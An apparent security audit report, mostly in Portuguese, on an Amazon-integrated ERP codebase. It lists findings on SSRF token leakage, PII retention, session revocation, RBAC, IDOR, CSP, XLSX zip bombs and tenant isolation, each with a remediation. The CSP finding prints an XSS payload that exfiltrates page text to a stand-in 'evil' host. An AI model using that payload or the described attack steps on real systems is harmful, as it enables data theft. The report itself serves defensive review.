**Remediação.** Validar amazon_endpoint/amazon_ads_endpoint no save (service.ts:saveAmazonConfig / ads-service.ts:saveAmazonAdsConfig): aceitar somente hosts de uma allowlist dos endpoints regionais oficiais da SP-API/Ads (ex: sellingpartnerapi-{na,eu,fe}.amazon.com, advertising-api*.amazon.com), exigir https, e rejeitar hosts privados/loopback/metadata. Idealmente remover a configurabilidade livre do endpoint e expor apenas um seletor de regiao. Reusar o mesmo helper safe-fetch/validacao-de-host do achado do WAHA.

**Relevância Amazon DPP.** ALTO. Vaza diretamente o access token OAuth da SP-API (o exato segredo que a DPP exige proteger e que o dono quer usar para conectar contas de clientes). Um SSRF que exfiltra o token de acesso de um seller para um host arbitrario e exatamente o tipo de falha de protecao de credenciais OAuth que reprova no questionario de seguranca da Amazon. Bloqueador.

**Verificação adversarial.** The vulnerability is real and exploitable as described. Here is the evidence from each layer:

1. **No URL validation in saveAmazonConfig / saveAmazonAdsConfig**: `src/modules/amazon/service.ts:180-201` and `src/modules/amazon/ads-service.ts:63-84` accept `amazon_endpoint` / `amazon_ads_endpoint` verbatim from the caller. Neither function performs any check on the scheme, hostname, or whether the value is on an allowlist. The only guards are: (a) reject keys not in `AMAZON_CONFIG_KEYS`/`ADS_CONFIG_KEYS` (the endpoint keys ARE in those lists), and (b) skip masked secret values. No URL validation whatsoever.

2. **Unvalidated endpoint flows into fetch with live access tokens**: `src/lib/amazon-sp-api.ts:202-223` — `const endpoint = creds.endpoint || DEFAULT_ENDPOINT; new URL(pathname, endpoint); fetch(url, { headers: { "x-amz-access-token": accessToken, … } })`. The access token obtained from LWA is attached to whatever URL is constructed from the attacker-supplied endpoint. `src/lib/amazon-ads-api.ts:243-274` does the same with `authorization: Bearer <token>` and `amazon-advertising-a…

---

### F14 · [MEDIUM] Ausência de rotina de retenção/exclusão de PII de pedido (<=30d pós-entrega exigido pela DPP)

- **Dimensão:** amazon-dpp-evidence · **Categoria:** Data Retention / Privacy (Amazon DPP) · **Confiança:** high
- **Severidade (auditor → verificador):** HIGH → MEDIUM · **Veredito:** CONFIRMED
- **Local:** `prisma/schema.prisma / src/modules/amazon/jobs.ts:507-589 (VendaAmazon, AmazonOrderRaw); jobs sem purge`

**Descrição.** A Amazon DPP exige que PII derivada de pedidos seja retida apenas pelo necessário e descartada em até 30 dias após a entrega (salvo obrigação fiscal/legal documentada), além de um mecanismo de exclusão sob demanda. Varri todo o codebase por jobs/cron/deleteMany por idade em VendaAmazon, AmazonOrderRaw, AmazonReturn e AmazonReimbursement e NÃO existe nenhuma rotina de purga. Os únicos 'retention' encontrados são REPORT_RETENTION_DAYS=95 no ads-optimizer (métricas de anúncio, não PII) e purgeHourlyForCoveredDays (métricas horárias de ads). VendaAmazon e AmazonOrderRaw crescem indefinidamente. Embora hoje quase não haja PII de comprador (ver achados de minimização), a falta de QUALQUER política/job de retenção é um item que o questionário DPP cobra explicitamente e bloqueia/atrasa a aprovação.

**Cenário de exploração.** Não é exploit técnico; é gap de compliance. No questionário de segurança DPP a Amazon pergunta 'How long is PII retained and what is the deletion mechanism?'. Sem job de purga nem política, a resposta honesta é 'retemos indefinidamente, sem mecanismo automático de exclusão' — reprovação direta no critério de Data Retention. Se no futuro for adicionado qualquer campo de PII de comprador (ex: endereço para FBM), o dado nunca seria expurgado.

**Remediação.** Criar job de retenção (ex: AMAZON_PII_RETENTION_PURGE, diário) que anonimize/exclua registros de pedido cujo dataVenda/entrega exceda 30 dias, preservando apenas o que houver obrigação fiscal (campos financeiros agregados, sem PII). Implementar endpoint/rotina de exclusão sob demanda por amazonOrderId (atender pedidos de deleção). Documentar a política de retenção (30d pós-entrega) num doc de compliance. Para dados fiscais retidos além de 30d, manter SOMENTE valores agregados sem PII.

**Relevância Amazon DPP.** Bloqueador direto do questionário DPP (seção Data Retention & Deletion). Mesmo com a minimização forte atual, a ausência de política e job de purga documentados reprova ou trava a autorização SP-API multi-seller.

**Verificação adversarial.** The finding is confirmed, but with an important nuance that justifies downgrading severity from HIGH to MEDIUM.

**What is confirmed:**
1. No purge/retention job exists for VendaAmazon, AmazonOrderRaw, AmazonReturn, or AmazonReimbursement — exhaustive grep for deleteMany, purge, retention on these models returns zero results across the entire src/ and scripts/ directories.
2. AmazonReturn.customerComments (schema.prisma line 1324, populated at jobs-handlers.ts line 1363 from `row.customerComments` parsed from FBA returns TSV via `pick(row, ["customer-comments", ...])`) persists buyer-written free-text content indefinitely. FBA returns TSV reports include this field verbatim from the buyer's return reason text, which qualifies as PII under the DPP.
3. AmazonOrderRaw.payloadJson stores `asJson(order)` (service.ts line 1484), the full raw SP-API response, with no scrubbing and no deletion policy.
4. No retention policy document or compliance artifact exists in the repository.

**What mitigates the CRITICAL/HIGH framing:**
- The system does NOT request Restricted Data Tokens (RDT) anywhe…

---

### F15 · [MEDIUM] payloadJson armazena resposta/linha BRUTA do pedido sem filtro de campos nem cifragem de coluna

- **Dimensão:** amazon-dpp-evidence · **Categoria:** Data Minimization / Encryption at-rest (Amazon DPP) · **Confiança:** high
- **Severidade (auditor → verificador):** MEDIUM → MEDIUM · **Veredito:** CONFIRMED
- **Local:** `src/modules/amazon/service.ts / src/modules/amazon/jobs-handlers.ts / src/modules/amazon/parsers/fba-returns-tsv.ts:service.ts:1484 (payloadJson: asJson(order)); jobs-handlers.ts:1366 (payloadJson: JSON.stringify(row.payload)); fba-returns-tsv.ts:76 (payload: row)`

**Descrição.** AmazonOrderRaw.payloadJson (service.ts:1484) persiste o objeto SPOrder inteiro via asJson(order), e AmazonReturn.payloadJson (jobs-handlers.ts:1366) persiste a LINHA BRUTA COMPLETA do report FBA returns (parsers/fba-returns-tsv.ts:76 guarda `payload: row` = TsvRecord inteiro, todas as colunas). É armazenamento 'guarde tudo cru' em vez de 'guarde só os campos modelados'. Hoje o SPOrder tipado não traz buyer PII e o report de returns mapeia customerComments explicitamente — mas o payload bruto pode capturar quaisquer colunas extras que a Amazon adicione (ex: buyer-name, ship-address em variantes do report, ou comentários de cliente com PII). O campo é String/Json em texto puro (prisma/schema.prisma e schema.postgresql.prisma) — NÃO usa a cifragem AES-256-GCM de crypto.ts (que só protege ConfiguracaoSistema).

**Cenário de exploração.** Um report FBA returns variante ou uma futura mudança da SP-API que inclua buyer-comments/endereço faria o payloadJson capturar PII silenciosamente, sem revisão. Esse PII ficaria em texto puro na coluna do Postgres, fora de qualquer política de retenção (ver gap de purga), e legível por qualquer ator com acesso de leitura ao banco (backup, dump, replica). customerComments (AmazonReturn) já é texto escrito pelo comprador e pode conter nome/telefone.

**Remediação.** Substituir 'guarde o payload bruto' por allowlist explícita de campos (já existe parsing — descartar o `payload: row` cru). Se o raw for necessário para reprocessamento, sanitizar removendo chaves de PII antes de persistir, e/ou cifrar a coluna payloadJson com encryptConfigValue/equivalente. Tratar customerComments como PII (cifrar ou truncar). Incluir esses campos na política de retenção <=30d.

**Relevância Amazon DPP.** Relevante para os critérios Data Minimization e Encryption at-rest. Armazenar payload cru aumenta a superfície de PII e a chance de capturar dados que a DPP proíbe reter; auditor da Amazon vê isso como coleta excessiva.

**Verificação adversarial.** The finding is partially correct but the severity is overstated. Here is what the code actually shows:

**AmazonOrderRaw.payloadJson (service.ts:1484):**
`asJson(order)` serializes the entire parsed API response cast as `SPOrder`. The `SPOrder` interface (amazon-sp-api.ts:54–70) contains no buyer PII fields whatsoever — only order metadata (`orderId`, timestamps, `orderStatus`, `salesChannel`, `orderItems`). Critically, the code never requests a Restricted Data Token (RDT) — there is no `RestrictedDataToken` parameter anywhere in the codebase. Without RDT, the SP-API Orders endpoints do not return `BuyerInfo` or `ShippingAddress`. The `readOrdersFromResponse` function also does not add extra fields. The theoretical risk of "unknown fields captured via `as T`" is real but bounded by what the API returns without RDT permission — which is not buyer PII.

**AmazonReturn.payloadJson (jobs-handlers.ts:1366):**
`payload: row` in `FbaReturnRow` is a `TsvRecord` (`Record<string, string>`) containing the entire raw TSV row. The FBA Returns report (GET_FBA_FULFILLMENT_CUSTOMER_RETURNS_DATA) doe…

---

### F16 · [MEDIUM] Trilha de auditoria não registra eventos de leitura/acesso a dados de comprador

- **Dimensão:** amazon-dpp-evidence · **Categoria:** Logging & Monitoring (Amazon DPP) · **Confiança:** medium
- **Severidade (auditor → verificador):** MEDIUM → MEDIUM · **Veredito:** CONFIRMED
- **Local:** `src/lib/audit.ts / prisma/schema.prisma:audit.ts:18-44 (auditLog grava só mutações com antes/depois); schema.prisma:1102-1124 (AuditLog WRITE-ONLY)`

**Descrição.** A DPP exige logging e monitoramento de ACESSO a PII (quem leu dados de comprador, quando). O auditLog (audit.ts:18) é projetado para MUTAÇÕES (campos antes/depois/metadata) e é chamado em fluxos de escrita; não há instrumentação de eventos de LEITURA de dados de pedido/comprador. O comentário em db.ts:137 confirma que AuditLog hoje é WRITE-ONLY (nenhum findMany consome a tabela). Logo, não há trilha de 'usuário X acessou os pedidos do seller Y'.

**Cenário de exploração.** Não é exploit; é gap de monitoramento. No questionário DPP ('Do you log access to Amazon Information / buyer PII?'), a resposta seria negativa para leitura. Em incidente de acesso indevido a dados de pedido, não haveria trilha para investigar quem consultou o quê.

**Remediação.** Instrumentar auditLog (ou um logger de acesso dedicado) nas rotas/serviços que LEEM dados de pedido/comprador (ex: GET /api/vendas, exports), registrando usuarioId, empresaId, escopo consultado e timestamp — sem logar a PII em si. Tornar AuditLog consultável e definir retenção dos logs. Garantir que pino (logger.ts) nunca emita PII/segredos em claro.

**Relevância Amazon DPP.** Item do questionário DPP (Logging & Monitoring de acesso a Amazon Information). A ausência de log de leitura enfraquece a aprovação e a capacidade de responder a auditoria/incidente.

**Verificação adversarial.** The finding is accurate and anchored in real code.

audit.ts:18-44 defines auditLog() as a mutation-centric helper (fields: acao, entidade, antesJson, depoisJson, metadataJson). A grep across the entire src/ tree shows it is called in exactly 12 files, all of which are write or authentication flows: login, 2FA verification, Amazon config PATCH, ads config PATCH, amazon sync POST, product/variation CRUD, and listing diff. No GET/read handler calls auditLog().

GET /api/vendas/route.ts reads VendaAmazon records (amazonOrderId, SKU, financial fields) and only emits a pino logger.info with aggregate metadata (count, duration, page) — no per-user, per-query access record is written anywhere. GET /api/vendas/reembolsos/route.ts is identical in structure. The same pattern holds for every other read endpoint examined.

AmazonOrderRaw.payloadJson stores the raw SP-API Orders API JSON blob, which in production contains restricted PII (ShippingAddress, BuyerInfo: name, phone, email) as delivered by Amazon. This table is only accessed by the internal worker (service.ts, jobs-handlers.ts), so it …

---

### F17 · [MEDIUM] Cookies de sessão sem campo `v` ignoram revogação por sessionVersion (graceful-pass indefinido)

- **Dimensão:** authn-session · **Categoria:** Identification and Authentication Failures · **Confiança:** high
- **Severidade (auditor → verificador):** MEDIUM → MEDIUM · **Veredito:** CONFIRMED
- **Local:** `src/lib/auth.ts:37-38`

**Descrição.** Em getSession, a checagem de revogação é `if (payload.v != null && payload.v !== user.sessionVersion) return null;`. Quando o payload do cookie NÃO traz `v` (cookies emitidos antes da migração de sessionVersion), a comparação é totalmente pulada e a sessão é aceita independentemente do sessionVersion atual do usuário. Isso significa que um cookie legado válido (assinado com o SESSION_SECRET, dentro de exp de até 30 dias com `lembrar`) continua autenticando MESMO APÓS o usuário trocar de senha, encerrar todas as sessões, ou ser alvo de reset — ações que incrementam sessionVersion justamente para revogar. O próprio comentário (L24) reconhece que a regra deveria ser endurecida após 30 dias do deploy, mas o código atual aceita o pass indefinidamente. Hoje todos os fluxos de assinatura preenchem `v`, então a janela são os cookies emitidos antes da migração; com maxAge de 30 dias (remember-me) a exposição persiste por até um mês após a migração.

**Cenário de exploração.** 1. Antes da migração de sessionVersion, um cookie 'remember-me' (30 dias) é emitido sem `v` para a vítima. 2. O cookie vaza (XSS histórico, device compartilhado, backup, log). 3. Vítima troca a senha / clica 'encerrar todas as sessões' achando que revogou tudo; sessionVersion incrementa. 4. O atacante com o cookie legado continua autenticado, pois `payload.v` é undefined e a checagem é pulada — a revogação não tem efeito sobre esse cookie até ele expirar naturalmente.

**Remediação.** Endurecer a regra: tratar ausência de `v` como inválida (return null) agora que todos os novos cookies já trazem `v` — ou no máximo aceitar somente se `exp` for posterior a uma data de corte pós-migração. Alternativamente, fazer rotação forçada do SESSION_SECRET para invalidar todos os cookies legados de uma vez.

**Relevância Amazon DPP.** MÉDIO. A DPP exige mecanismo efetivo de revogação/encerramento de sessão como parte do controle de acesso a dados protegidos. Um caminho onde 'encerrar todas as sessões' / troca de senha não revoga de fato uma sessão é uma fraqueza de gestão de sessão que pode ser questionada na avaliação de segurança.

**Verificação adversarial.** The vulnerability is real and evidenced directly in the code.

`src/lib/auth.ts` L38: `if (payload.v != null && payload.v !== user.sessionVersion) return null;` — when `payload.v` is `undefined` (absent from the JWT payload), the strict inequality `payload.v != null` evaluates to `false`, the entire block is skipped, and the session is accepted regardless of `user.sessionVersion`. This is a confirmed graceful-pass that neutralises session revocation for any cookie that pre-dates the `sessionVersion` migration.

Key facts verified:

1. The migration `20260523120000_usuario_session_version` was deployed 2026-05-23 — only 9 days before today (2026-06-01). The 30-day remember-me window (THIRTY_DAYS_SECONDS in session.ts L7/L122) means cookies issued before that date without `v` can still be active until approximately 2026-06-22.

2. All current `signSession` call-sites (login/route.ts L159, alterar-senha/route.ts L70, encerrar-sessoes/route.ts L45, 2fa/verificar/route.ts L131) consistently populate `v`. So no new cookie will lack `v` going forward — the exposure is bounded to the pre-mig…

---

### F18 · [MEDIUM] SESSION_SECRET/PLATAFORMA_SESSION_SECRET validados só por comprimento (≥32), sem garantia de entropia

- **Dimensão:** authn-session · **Categoria:** Cryptographic Failures · **Confiança:** medium
- **Severidade (auditor → verificador):** LOW → MEDIUM · **Veredito:** CONFIRMED
- **Local:** `src/lib/session.ts:27-35`

**Descrição.** getSecret() em session.ts (e o equivalente em plataforma-session.ts L12-18) só rejeita segredos com menos de 32 caracteres. Um valor como 32 'a's, ou uma frase fraca de 32 chars, é aceito como chave HMAC de assinatura de TODA sessão. Como a sessão é stateless (o servidor confia inteiramente na assinatura HMAC), um SESSION_SECRET de baixa entropia permite forjar cookies de sessão arbitrários (qualquer uid/role/empresaId) se o segredo for adivinhado/quebrado offline. O .env.example orienta gerar randomBytes(48).toString('hex'), mas nada no código impede um valor fraco em produção.

**Cenário de exploração.** 1. Operador define SESSION_SECRET com um valor de 32 chars fraco/previsível (ex: nome do projeto repetido). 2. Atacante obtém um cookie de sessão legítimo (formato payload.assinatura). 3. Faz brute-force/dicionário offline da chave HMAC contra esse par conhecido. 4. Recuperada a chave, forja um cookie com role=ADMIN e empresaId arbitrário, obtendo auth bypass total e acesso cross-tenant.

**Remediação.** No boot (ou em getSecret), além do comprimento mínimo, exigir entropia: rejeitar segredos com baixa diversidade de caracteres ou abaixo de ~256 bits efetivos; documentar e validar que o valor venha de um CSPRNG. Para defesa adicional, considerar rotação periódica do segredo.

**Relevância Amazon DPP.** ALTO em caso de exploração (vazamento cross-tenant via forja de cookie), porém probabilidade depende de má configuração operacional. A DPP exige proteção forte de segredos e isolamento de tenants; um controle que permita chave de assinatura fraca é uma observação válida de hardening criptográfico para o questionário.

**Verificação adversarial.** The vulnerability is real but the auditor's exploit scenario overstates the impact by describing the session as purely stateless, which it is not.

WHAT THE CODE ACTUALLY DOES:
- `session.ts` L27-35 and `plataforma-session.ts` L12-18: `getSecret()` only checks `secret.length < 32`. A string of 32 identical characters passes. No entropy requirement exists. The .env.example documents `randomBytes(48).toString('hex')` but this is advisory, not enforced at runtime.
- HMAC-SHA256 via Web Crypto is used to sign the cookie payload (uid, email, nome, role, exp, empresaId, v).
- The cookie IS stateless at the cryptographic layer — if the key is recovered, arbitrary payloads can be signed.

MITIGATING FACTOR THE AUDITOR MISSED — PARTIAL STATEFUL VALIDATION:
`auth.ts` L32-38 in `getSession()` performs a DB lookup on EVERY request:
```
db.usuario.findUnique({ where: { id: payload.uid }, select: { ativo: true, sessionVersion: true } })
if (!user || !user.ativo) return null;
if (payload.v != null && payload.v !== user.sessionVersion) return null;
```
This means a forged cookie with a fabricated/ra…

---

### F19 · [MEDIUM] canAccessPath e default-allow: rotas fora de ADMIN_PATH_PREFIXES sao liberadas a todos os papeis

- **Dimensão:** authz-rbac-idor · **Categoria:** Broken Access Control / RBAC · **Confiança:** high
- **Severidade (auditor → verificador):** MEDIUM → MEDIUM · **Veredito:** CONFIRMED
- **Local:** `src/proxy.ts:210-230`

**Descrição.** canAccessPath nega so dois casos: ADMIN tem tudo (211); LEITURA nao pode mutar (212); e bloqueia ADMIN-only quando o path casa ADMIN_PATH_PREFIXES e nao casa OPERATOR (214-215). Para OPERADOR/FINANCEIRO/LEITURA, o retorno final e `!matchesPrefix(ADMIN_PATH_PREFIXES)` (218/222/226/229) — ou seja, QUALQUER path nao listado em ADMIN_PATH_PREFIXES e permitido. Rotas de dominio financeiro como /api/contas, /api/movimentacoes, /api/documentos-financeiros, /api/contas-fixas, /api/tarefas, /api/vendas nao estao em ADMIN_PATH_PREFIXES, entao passam no proxy para OPERADOR e ate LEITURA (em GET). O gate efetivo vira o requireRole por rota — defesa em camada unica e fragil: basta um route.ts esquecer o requireRole (so requireSession) para abrir acesso indevido.

**Cenário de exploração.** Um endpoint sensivel novo criado sem requireRole (apenas requireSession ou handleAuth sem roles) fica acessivel a qualquer papel porque o proxy nao o cobre (ex.: GET /api/produtos/[id]/buybox-historico usa handleAuth sem roles → LEITURA acessa dados de produto). O proxy da falsa sensacao de RBAC central enquanto na pratica e allow-by-default.

**Remediação.** Inverter para deny-by-default: mapear explicitamente cada prefixo de API ao(s) papel(eis) permitido(s) e negar o que nao casar nenhuma regra. Manter requireRole por rota como defense-in-depth, nao como unica linha.

**Relevância Amazon DPP.** Media. Least-privilege fraco. Nao e vazamento direto, mas a postura allow-by-default aumenta a chance de exposicao acidental de dados (inclusive PII de pedidos) a papeis que nao deveriam ve-los — ponto observado pelo questionario de seguranca.

**Verificação adversarial.** The finding is real and anchored in concrete code evidence. `canAccessPath` in `src/proxy.ts` lines 217-229 implements a default-allow design: for OPERADOR the return is `matchesPrefix(OPERATOR_PATH_PREFIXES) || !matchesPrefix(ADMIN_PATH_PREFIXES)`, and for FINANCEIRO it is `matchesPrefix(FINANCE_PATH_PREFIXES) || !matchesPrefix(ADMIN_PATH_PREFIXES)`. Any path not in ADMIN_PATH_PREFIXES falls through as allowed.

Concrete exploitable cases confirmed by reading the route handlers:

1. `GET /api/contas` — not in ADMIN_PATH_PREFIXES nor OPERATOR_PATH_PREFIXES. Proxy allows it for OPERADOR and LEITURA (GET). Handler (`src/app/api/contas/route.ts` line 10) only calls `requireSession()` with no role check. An OPERADOR or LEITURA user can read all accounts-payable financial data.

2. `GET /api/contas-a-receber` — same analysis. Handler (`src/app/api/contas-a-receber/route.ts` line 8) only calls `requireSession()`. OPERADOR/LEITURA can read all Amazon settlement receivables.

3. `GET /api/contas-fixas` — handler (`src/app/api/contas-fixas/route.ts` line 10) only calls `requireSession()`. Pro…

---

### F20 · [MEDIUM] Custos eventuais de venda criados/listados/deletados por id de venda sem escopo de empresa

- **Dimensão:** authz-rbac-idor · **Categoria:** Broken Access Control / IDOR · **Confiança:** high
- **Severidade (auditor → verificador):** MEDIUM → MEDIUM · **Veredito:** CONFIRMED
- **Local:** `src/app/api/vendas/[vendaId]/custos-eventuais/route.ts:19-66`

**Descrição.** GET/POST validam a venda com vendaAmazon.findUnique({where:{id:vendaId}, select:{id:true}}) — sem empresaId no where nem no select (linhas 19-23, 52-56) — e criam/listam VendaCustoEventual por vendaAmazonId. O DELETE em [custoId]/route.ts (18-24) usa findFirst({where:{id,vendaAmazonId}}) tambem sem empresaId. VendaCustoEventual tem empresaId String? (schema 536-548) mas nada o escopa na rota. Em off e IDOR; em enforce o select:{id:true} dispara fail-closed (throw) na extensao para o findUnique, quebrando a rota.

**Cenário de exploração.** Pos multi-seller (off): usuario do seller A faz POST /api/vendas/<vendaId-do-B>/custos-eventuais injetando custos na venda do seller B (corrompendo o lucro/DRE alheio) ou GET listando custos de vendas de outro tenant.

**Remediação.** Escopar a venda por empresa (findFirst({where:{id:vendaId, empresaId}})) e incluir empresaId nos selects. Aplicar o mesmo no DELETE. Ligar enforce.

**Relevância Amazon DPP.** Baixa-media. Adultera dados financeiros derivados de pedidos cross-tenant; relevante para integridade de dados no multi-seller, sem vazar PII diretamente.

**Verificação adversarial.** Verified the finding by reading all relevant files: the route handlers, the `handleAuth`/`api.ts` wrapper, `db.ts` (Prisma extension), `tenant-context.ts`, and the isolation test suite.

**TENANT_ISOLATION=off (current default — the exploitable state):**
- `handleAuth` does call `withTenantContextFromSession`, which calls `runWithTenant` populating the ALS context. However, `applyTenantIsolation` (db.ts line 312) short-circuits immediately with `return query(args)` when `tenantMode() === "off"` — the ALS context is populated but completely ignored. No `empresaId` filter is injected anywhere.
- The route's `db.vendaAmazon.findUnique({ where: { id: vendaId }, select: { id: true } })` checks only that the `vendaId` exists in the DB, not that it belongs to the authenticated user's company. A user from tenant A can supply a `vendaId` from tenant B and the check passes.
- Subsequently, `db.vendaCustoEventual.findMany({ where: { vendaAmazonId: vendaId } })` (GET) or `db.vendaCustoEventual.create({ data: { vendaAmazonId: vendaId, ... } })` (POST) also operate without empresa scoping. Cross-t…

---

### F21 · [MEDIUM] CSP permite 'unsafe-inline' em script-src em PRODUCAO (sem nonce/hash) — anti-XSS enfraquecido

- **Dimensão:** csrf-cors-headers · **Categoria:** Security Misconfiguration / XSS Defense · **Confiança:** high
- **Severidade (auditor → verificador):** MEDIUM → MEDIUM · **Veredito:** CONFIRMED
- **Local:** `src/proxy.ts:96-116`

**Descrição.** cspDirectives() emite `script-src 'self' 'unsafe-inline'` tambem em producao (linha 97-100). Com 'unsafe-inline' presente, a CSP NAO oferece protecao contra XSS via injecao de <script>...</script> ou atributos: qualquer payload refletido/armazenado que chegue ao HTML executa. Nao ha nonce nem strict-dynamic em lugar nenhum (grep por nonce/strict-dynamic retornou vazio), entao a CSP de script vira essencialmente decorativa. O comentario no codigo (linha 95) menciona que script-src-attr 'none' corta handlers inline, mas isso so cobre atributos on*; nao impede <script> inline. style-src 'unsafe-inline' e tolerável, mas script-src 'unsafe-inline' e a perda critica.

**Cenário de exploração.** 1. Atacante encontra um ponto de XSS armazenado/refletido (ex: campo de texto livre renderizado sem escape em algum dashboard/relatorio). 2. Injeta <script>fetch('https://evil/c?d='+btoa(document.body.innerText))</script>. 3. Como connect-src e 'self', a exfiltracao direta via fetch para evil seria bloqueada — POREM a execucao do script NAO e bloqueada (unsafe-inline), e o atacante pode ler/alterar a UI, fazer acoes autenticadas same-origin (criar contas a pagar, disparar syncs, ler PII de comprador exibida em /vendas), ou usar img-src data:/blob: e navegacao para exfiltrar. A unica barreira efetiva contra script injetado seria a remocao de 'unsafe-inline'.

**Remediação.** Migrar para CSP baseada em nonce: gerar um nonce por request no proxy, injeta-lo nos <script> do Next (next.config experimental ou via header), e trocar `script-src 'self' 'unsafe-inline'` por `script-src 'self' 'nonce-<v>' 'strict-dynamic'` em producao. Manter 'unsafe-inline' apenas em dev/report-only. Enquanto a migracao de nonce nao acontece, ao menos validar e ativar CSP enforce (ja default em prod) e documentar o risco residual.

**Relevância Amazon DPP.** ALTA. A Amazon DPP exige controles contra XSS e protecao de PII de comprador (nome/endereco/telefone de pedidos sao exibidos em telas de vendas). Uma CSP com 'unsafe-inline' em script-src e tipicamente apontada no questionario de seguranca como controle anti-XSS ausente/insuficiente, podendo travar a aprovacao para conectar contas de sellers terceiros.

**Verificação adversarial.** Leitura direta do código confirma o achado em todos os pontos materiais:

1. **unsafe-inline em produção confirmado** (`src/proxy.ts` linhas 97-100): Em `NODE_ENV === "production"`, `cspDirectives()` emite `script-src 'self' 'unsafe-inline'` sem nonce, sem hash, sem `strict-dynamic`. A diferença entre prod e dev é apenas a ausência de `'unsafe-eval'` em prod — `'unsafe-inline'` permanece nos dois ambientes.

2. **CSP é enforce em produção, não Report-Only** (`src/proxy.ts` linhas 118-128, função `cspHeaderName()`): Quando `NODE_ENV === "production"`, o header emitido é `Content-Security-Policy` (enforce), não `Content-Security-Policy-Report-Only`. O `docs/csp.md` menciona "modo Report-Only desde 2026-05-23", mas o código atual contradiz isso — produção está em enforce. Isso na verdade torna o achado ligeiramente menos grave do que se fosse Report-Only (a CSP ao menos bloqueia algumas diretivas), mas o ponto central sobre `'unsafe-inline'` no `script-src` continua válido.

3. **Nenhum nonce implementado**: `get-nonce` aparece apenas como dependência transitiva em `package-lock.json` (…

---

### F22 · [MEDIUM] XLSX importado e descomprimido sem limite (zip bomb / DoS de memoria)

- **Dimensão:** file-upload · **Categoria:** Denial of Service / Resource Exhaustion · **Confiança:** high
- **Severidade (auditor → verificador):** MEDIUM → MEDIUM · **Veredito:** CONFIRMED
- **Local:** `src/lib/fba-importer.ts:239-243 (processarBuffer: validarBufferXlsx + wb.xlsx.load) e 42-44/157-159 (ws.eachRow carrega todas as linhas em array)`

**Descrição.** validarBufferXlsx so checa extensao, MIME, tamanho do ARQUIVO COMPRIMIDO (<=10MB) e a assinatura ZIP (504b...). Logo em seguida processarBuffer chama wb.xlsx.load(buffer) e importarVendas/sincronizarEstoque fazem ws.eachRow((row)=>rows.push(row)), materializando TODAS as linhas em memoria. XLSX e um ZIP de XML; um arquivo de poucos MB pode descomprimir para varios GB (zip bomb) ou conter milhoes de linhas/celulas. exceljs nao impoe cap de descompressao nem de contagem de celulas. O mesmo padrao reaparece em src/lib/gestor-seller-sync.ts (ExcelJS) e indiretamente via email-processor para anexos. Resultado: um OPERADOR autenticado (role minima exigida) consegue derrubar o processo Node por OOM, afetando web+worker no mesmo host PM2.

**Cenário de exploração.** 1. Atacante com role OPERADOR (ou superior) gera um .xlsx 'zip bomb' (~5MB comprimido, descomprime para multiplos GB) ou um xlsx legitimo com ~5 milhoes de linhas. 2. POST /api/vendas/importar com o arquivo (passa o limite de 12MB do proxy e a assinatura ZIP). 3. wb.xlsx.load + ws.eachRow estouram a heap do processo erp-web. 4. PM2 reinicia o processo; repetindo, mantem o ERP indisponivel para todos os tenants no host.

**Remediação.** Impor teto de descompressao e de complexidade antes/durante o parse: (1) limitar o tamanho TOTAL descomprimido (inspecionar os tamanhos das entries do ZIP do xlsx e abortar se a soma exceder, ex., 100MB, ou usar streaming reader com limite); (2) cortar a leitura apos N linhas (ex. 200k) e abortar com erro; (3) preferir o reader em streaming do exceljs (WorkbookReader) em vez de load() integral; (4) considerar processar importacoes pesadas no worker, fora do processo web, com limites de memoria dedicados.

**Relevância Amazon DPP.** Indireto. A Amazon DPP avalia disponibilidade/resiliencia e gestao de incidentes; um vetor de DoS trivial via upload enfraquece a postura de seguranca apresentada no questionario, ainda que nao seja vazamento de PII.

**Verificação adversarial.** The vulnerability is real and the auditor's code references are accurate.

**What the validation actually does:**
- `validarBufferXlsx` (upload-security.ts:66-84) checks `buffer.length <= 10MB` — this is the COMPRESSED size of the ZIP/XLSX container, not the decompressed XML payload.
- The proxy `exceedsBodySizeLimit` (proxy.ts:198-204) checks only the `content-length` HTTP header. An attacker using chunked transfer encoding (no `Content-Length` header) bypasses this check entirely; the middleware never reads the body stream.
- `wb.xlsx.load(buffer)` (fba-importer.ts:242, gestor-seller-sync.ts:102, 244, 423) hands the raw buffer to ExcelJS, which uses the Node `zlib` decompressor with no decompression size limit. ExcelJS's `WorkbookReader` streaming mode is not used; `load()` decompresses all XML entries fully into memory.
- `ws.eachRow((row) => rows.push(row))` (fba-importer.ts:43, 158; gestor-seller-sync.ts:108, 250) materializes every row into a JS array with no row count ceiling.

**Exploitability (with pre-condition):**
An authenticated OPERADOR user (the minimum role for `/api/…

---

### F23 · [MEDIUM] Uniques de negocio simples + upsert que nao escopa where permitem casar/sobrescrever linha de outro tenant

- **Dimensão:** multi-tenant · **Categoria:** Broken Access Control / Multi-Tenant Isolation · **Confiança:** high
- **Severidade (auditor → verificador):** HIGH → MEDIUM · **Veredito:** CONFIRMED
- **Local:** `src/lib/db.ts:263-283`

**Descrição.** injectUpsertEmpresaId deixa o `where` do upsert INALTERADO de proposito (L249-261, L267) porque o Prisma so aceita campos de indice unico no seletor. Mas varios uniques de NEGOCIO sao SIMPLES, sem empresaId: VendaAmazon @@unique([amazonOrderId, sku]) (schema L520), AmazonOrderRaw amazonOrderId @unique (L553), InventorySnapshot @@unique([sku, dataSnapshot]) (L1241), AmazonSkuTrafficDaily @@unique([sku, data]) (L1372), AmazonFinanceTransaction.transactionId @unique (L1202), AmazonSettlementReport reportId/settlementId @unique (L1154-1156), Notificacao @@unique([empresaId, dedupeKey]) (esse SIM e composto). Quando dois sellers tem o mesmo sku (ou amazonOrderId em sandbox/colisao), o upsert de um casa a linha PRE-EXISTENTE do outro e executa o branch update sobre ela. O proprio db.ts documenta a limitacao (L256-261) e diz que os uniques DEVEM virar compostos antes do onboard externo — mas isso ainda nao foi feito.

**Cenário de exploração.** Com enforce ligado: 1) Seller A tem VendaAmazon/InventorySnapshot para sku 'X'. 2) Worker/sync do seller B processa um sku 'X' (mesmo SKU literal — comum em catalogos genericos) e faz upsert por (sku, dataSnapshot). 3) O where casa a linha do seller A; update da extensao remove empresaId do data (L274-281) mas escreve sobre os campos da linha de A. 4) Dados de estoque/venda de A sao corrompidos/sobrescritos por B (e vice-versa). Em modelos com amazonOrderId @unique, colisao = leitura/escrita cruzada de pedido.

**Remediação.** Migrar TODOS os uniques de negocio para compostos com empresaId (@@unique([empresaId, amazonOrderId, sku]) etc.) ANTES de habilitar multi-tenant, e passar empresaId no where do upsert nos call sites. Adicionar teste que prove que upsert do tenant B nao casa linha do tenant A.

